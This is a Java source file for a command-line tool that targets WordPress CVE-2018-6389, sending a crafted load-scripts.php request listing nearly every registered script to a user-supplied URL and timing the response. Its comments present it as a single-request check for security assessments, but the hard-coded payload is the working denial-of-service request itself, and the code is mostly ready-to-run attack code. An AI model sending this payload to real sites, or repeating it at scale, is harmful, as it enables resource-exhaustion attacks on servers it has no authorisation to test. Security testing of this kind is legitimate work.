package com.afs.exploit.wordpress;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Tries to exploit a WordPress vulnerability (CVE-2018-6389) which can be used to cause a Denial of Service.
 * WARNING: This software does not perform DoS on vulnerable targets; it executes one HTTP GET call only to
 * check if the vulnerability is present.
 * This software is written to have no external dependencies.
 * DISCLAIMER: This tool is intended for security engineers and appsec guys for security assessments. Please
 * use this tool responsibly. I do not take responsibility for the way in which any one uses this application.
 * I am NOT responsible for any damages caused or any crimes committed by using this tool.
 * ..................
 * . CVE-ID ........: CVE-2018-6389
 * . Link ..........: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 * . Description ...: In WordPress through 4.9.2, unauthenticated attackers can cause a denial of service
 * .................. (resource consumption) by using the large list of registered .js files
 * .................. (from wp-includes/script-loader.php) to construct a series of requests
 * .................. to load every file many times.
 * ..................
 * 
 * @author Antonio Francesco Sardella
 */
public class WordPressCve20186389 {

    /**
     * Version string.
     */
    private static final String VERSION = "v1.0 (2018-03-04)";

    /**
     * Malicious payload.
     */
    private static String PAYLOAD = "/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter";

    /**
     * Max number of chars that will be printend in the response.
     */
    private static int RESPONSE_CHARS_LIMIT = 2048;

    /**
     * The target URL.
     */
    private URL url;

    /**
     * Verbosity flag.
     */
    private boolean verbose;

    /**
     * Default constructor.
     */
    public WordPressCve20186389() {
        this.verbose = false;
    }

    /**
     * Performs the exploit.
     * 
     * @throws IOException
     *             If something bad occurs during HTTP GET.
     */
    public void exploit() throws IOException {
        checkInput();
        printInput();
        long startTime = System.currentTimeMillis();
        String response = httpGet();
        long endTime = System.currentTimeMillis();
        long timing = endTime - startTime;
        printOutput(response, timing);

    }

    /**
     * Checks the input.
     */
    private void checkInput() {
        if (this.url == null) {
            throw new IllegalArgumentException("URL must be passed.");
        }
    }

    /**
     * Prints input if verbose flag is true.
     */
    private void printInput() {
        if (isVerbose()) {
            System.out.println("[*] Target URL ...: " + this.url);
        }
    }

    /**
     * HTTP GET operation on the target passing the malicious payload.
     * 
     * @param payload
     *            The malicious payload.
     * @return The response as a string.
     * @throws IOException
     *             If something bad occurs during HTTP GET.
     */
    private String httpGet() throws IOException {
        System.out.println("[*] Sending payload.");

        // Performing GET operation.
        HttpURLConnection connection = (HttpURLConnection) this.url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

        // Reading response code.
        int responseCode = connection.getResponseCode();
        System.out.println("[*] HTTP " + responseCode);

        // Reading response content.
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
            response.append(System.getProperty("line.separator"));
        }
        in.close();

        return response.toString();
    }

    /**
     * Prints output.
     * 
     * @param response
     *            Response that will be printed.
     */
    private void printOutput(String response, long timing) {
        System.out.println("[*] vvv Response vvv");
        System.out.println(response.substring(0, RESPONSE_CHARS_LIMIT));
        System.out.println("[*] ^^^ ======== ^^^");
        System.out.println("[*] (only first " + RESPONSE_CHARS_LIMIT + " chars were printed)");
        System.out.println("[*] Response with '" + response.length() + "' chars received after '" + timing + "' msec.");
    }

    /**
     * Checks if an input string is null/empty or not.
     * 
     * @param input
     *            The input string to check.
     * @return True if the string is null or empty, false otherwise.
     */
    private boolean isEmpty(String input) {
        boolean isEmpty;

        if (input == null || input.trim().length() < 1) {
            isEmpty = true;
        } else {
            isEmpty = false;
        }

        return isEmpty;
    }

    /* Getters and setters. */

    public boolean isVerbose() {
        return verbose;
    }

    public void setVerbose(boolean verbose) {
        this.verbose = verbose;
    }

    public void setUrl(String url) throws MalformedURLException {
        if (isEmpty(url)) {
            throw new IllegalArgumentException("URL must be not null and not empty.");
        }

        // Trimming, replacing the last slash and adding the payload.
        this.url = new URL(url.trim().replaceAll("/$", "") + PAYLOAD);
    }

    /**
     * Shows the program help.
     */
    public static final void help() {
        System.out.println("Usage:");
        System.out.println("   java -jar wordpress_cve-2017-6389.jar [options]");
        System.out.println("Description:");
        System.out.println("   Exploiting WordPress vulnerability which can be used to cause");
        System.out.println("   a Denial of Service (CVE-2018-6389).");
        System.out.println("Options:");
        System.out.println("   -h, --help");
        System.out.println("      Prints this help and exits.");
        System.out.println("   -u, --url [target_URL]");
        System.out.println("      The target URL where the exploit will be performed. This");
        System.out.println("      parameter must point to the root folder of the WordPress");
        System.out.println("      installation.");
        System.out.println("   -v, --verbose");
        System.out.println("      Optional. Increase verbosity.");
    }

    /**
     * Main method.
     * 
     * @param args
     *            Input arguments
     */
    public static void main(String[] args) {
        try {
            System.out.println("WordPress possible DoS (CVE-2018-6389) - " + VERSION);
            WordPressCve20186389 o = new WordPressCve20186389();

            if (args.length > 0) {
                for (int i = 0; i < args.length; i++) {

                    String p = args[i];

                    if (("-h".equals(p) || "--help".equals(p)) && i == 0) {
                        WordPressCve20186389.help();
                        return;
                    } else if ("-u".equals(p) || "--url".equals(p)) {

                        if (i + 1 > args.length - 1) {
                            throw new IllegalArgumentException("URL must be passed.");
                        }
                        o.setUrl(args[++i]);

                    } else if ("-v".equals(p) || "--verbose".equals(p)) {
                        o.setVerbose(true);
                    }

                }

                // Performing the exploit.
                o.exploit();

            } else { // Wrong number of arguments.
                WordPressCve20186389.help();
                return;
            }

        } catch (MalformedURLException mue) {
            System.out.println("[!] Input error (malformed URL): " + mue.getMessage());
        } catch (IllegalArgumentException iae) {
            System.out.println("[!] Input error (illegal argument): " + iae.getMessage());
        } catch (Exception e) {
            System.out.println("[!] Unexpected exception: " + e.getMessage());
            e.printStackTrace();
        }

    }

}
